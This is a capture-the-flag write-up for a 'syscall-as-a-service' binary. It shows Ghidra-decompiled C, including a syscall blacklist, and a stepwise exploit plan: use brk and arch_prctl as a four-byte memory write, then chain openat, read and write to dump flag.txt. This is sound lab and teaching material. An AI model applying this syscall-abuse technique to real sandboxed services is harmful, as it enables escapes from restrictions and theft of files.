# Saas

Final code is at `soln.py`.
The binary itself is at `./saas`.
Constants for pwntools are obtained using `constant.c`.

Open the binary in Ghidra.
After appropriate tinkering with function types and variable renamings, you obtain this C source code:

```c
void main(void)
{
  int iVar1;
  long lVar2;
  undefined8 uVar3;
  long rax;
  long rdi;
  long rsi;
  long rdx;
  long r10;
  long r9;
  long r8;

  setup();
  puts("Welcome to syscall-as-a-service!\n");
  do {
    while( true ) {
      printf("Enter rax (decimal): ");
      __isoc99_scanf(&scanf_format_ld,&rax);
      iVar1 = blacklist(rax);
      if (iVar1 == 0) break;
      puts("Sorry syscall is blacklisted\n");
    }
    printf("Enter rdi (decimal): ");
    __isoc99_scanf(&scanf_format_ld,&rdi);
    printf("Enter rsi (decimal): ");
    __isoc99_scanf(&scanf_format_ld,&rsi);
    printf("Enter rdx (decimal): ");
    __isoc99_scanf(&scanf_format_ld,&rdx);
    printf("Enter r10 (decimal): ");
    __isoc99_scanf(&scanf_format_ld,&r10);
    printf("Enter r9 (decimal): ");
    __isoc99_scanf(&scanf_format_ld,&r9);
    printf("Enter r8 (decimal): ");
    uVar3 = 0x101466;
    __isoc99_scanf(&scanf_format_ld,&r8);
    lVar2 = syscall(rax,rdi,rsi,rdx,r10,r8,r9,uVar3);
    printf("Rax: 0x%lx\n\n",lVar2);
  } while( true );
}


int blacklist(long param_1)
{
  int result;
  long in_FS_OFFSET;
  int i;
  long local_48 [7];
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48[0] = 0x3b; /* execve */
  local_48[1] = 0x39; /* fork */
  local_48[2] = 0x38; /* clone */
  local_48[3] = 0x3e; /* kill */
  local_48[4] = 0x65; /* ptrace */
  local_48[5] = 200; /* tkill */
  local_48[6] = 0x142; /* stub_execveat */
  i = 0;
  do {
    if (6 < (uint)i) {
      result = 0;
LAB_001012e3:
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return result;
    }
    if (param_1 == local_48[i]) {
      result = 1;
      goto LAB_001012e3;
    }
    i = i + 1;
  } while( true );
}
```

Note that the binary basically allows you to perform any linux syscall except for 7 blacklisted ones.

A list of x64 Linux syscalls and their parameters can be found at https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

An interesting syscall is syscall 158 `sys_arch_prctl`.
This syscall allows you to write anywhere in the memory 4 bytes at a time by calling:
```c
arch_prctl(ARCH_SET_GS, value);
arch_prctl(ARCH_GET_GS, address);
```

Out of pure guesswork, the flag should be located at the same directory as the binary with the file name `flag.txt`

So the idea of the exploit in C is:
```c
int fd;
char flag[255];

fd = openat(AT_FDCWD, "flag.txt", O_RDONLY);
read(fd, flag, 255);
write(STDOUT_FILENO, flag, 255);
```

So the procedure to achieve this is:
1. Allocate memory on the heap
2. Write `"flag.txt"` to the heap
3. Call the `openat` syscall and get the file descriptor number
4. Call the `read` syscall to dump the content of the file into the heap
5. Call the `write` syscall to dump the content of the heap into stdout

Note that `"flag.txt"` has 9 bytes (null-terminated), so we need to write in 3 steps.

Expressed in terms of syscalls pseudocode:
1. `heap = brk(0);`: Obtain the base address of the heap
1. `brk(heap + 0x10000)`: Extend the heap by `0x10000` bytes
1. `arch_prctl(ARCH_SET_GS, "flag"); arch_prctl(ARCH_GET_GS, heap)`
1. `arch_prctl(ARCH_SET_GS, ".txt"); arch_prctl(ARCH_GET_GS, heap + 4)`
1. `arch_prctl(ARCH_SET_GS, "\0"); arch_prctl(ARCH_GET_GS, heap + 8)`
1. `fd = openat(AT_FDCWD, heap, O_RDONLY)`: open the file and get the file descriptor
1. `read(fd, heap, 0xFF)`: Read the content of the file into the heap
1. `write(STDOUT_FILENO, heap, 0xFF)`: Print the content of the heap

In the solution, I built abstraction to make a syscall as function `g`, and to write 4 bytes as function `write32`
